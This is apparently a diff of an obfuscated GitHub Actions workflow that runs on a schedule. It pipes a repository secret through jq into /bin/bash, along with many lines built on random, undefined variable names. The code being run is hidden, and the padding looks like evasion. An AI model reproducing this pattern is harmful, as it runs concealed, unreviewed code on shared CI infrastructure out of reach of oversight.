@@ -1,23 +1,35 @@
 name: jiankonshig
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
-
-jobs:  # 5398
+    - cron: '26 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiankonshig
         env:
-          zzrpg184: ${{ secrets.zzrpg184 }}
+          daddi16747: ${{ secrets.daddi16747 }}
         run: |
-          echo $zzrpg184 | jq -r .ynksw173 | /bin/bash
-          echo $so40267 | jq -r .ah0 | /bin/bash
-          echo $puc7998 | jq -r .cwc9899 | /bin/bash
-          echo $mivv836 | jq -r .fldl5 | /bin/bash
-          echo $z5953 | jq -r .o390 | /bin/bash
-          echo $pjb105 | jq -r .i53883 | /bin/bash
+          echo $daddi16747 | jq -r .y822 | /bin/bash
+          echo $vnmlc7 | jq -r .xehnx25 | /bin/bash
+          echo $seo0191 | jq -r .g8 | /bin/bash
+          echo $pxbpt1415 | jq -r .wgz2849 | /bin/bash
+          echo $tcukg7175 | jq -r .q8566 | /bin/bash
+          echo $vci67 | jq -r .tigu54 | /bin/bash
+          echo $g10 | jq -r .vwn4 | /bin/bash
+          echo $pbas5799 | jq -r .safxb1 | /bin/bash
+          echo $q53 | jq -r .p24310 | /bin/bash
+          echo $djtzp640 | jq -r .u9047 | /bin/bash
+          echo $h80348 | jq -r .gxlqi18256 | /bin/bash
+          echo $n2337 | jq -r .m84456 | /bin/bash
+          echo $jwu6198 | jq -r .wwvxn3173 | /bin/bash
+          echo $fkaqq0 | jq -r .ab434 | /bin/bash
+          echo $ylz32 | jq -r .rlitt313 | /bin/bash
+          echo $dovr4221 | jq -r .sipuo956 | /bin/bash
+          echo $aia16 | jq -r .ah20410 | /bin/bash
+          echo $hgn97157 | jq -r .is8 | /bin/bash
+          echo $jfh94399 | jq -r .jb6407 | /bin/bash
 
